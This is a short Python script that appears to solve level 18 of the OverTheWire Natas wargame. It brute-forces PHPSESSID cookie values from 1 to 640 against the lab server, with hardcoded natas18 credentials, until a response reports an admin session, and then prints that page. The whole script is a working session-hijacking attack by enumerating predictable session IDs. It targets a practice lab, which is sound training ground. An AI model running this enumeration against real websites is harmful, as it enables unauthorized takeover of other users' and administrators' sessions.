import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth = ("natas18", " xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    r = requests.get(url, auth=auth, cookies=cookies)
    
    if "You are an admin" in r.text:
        print("Found admin session:", i)
        print(r.text)
        break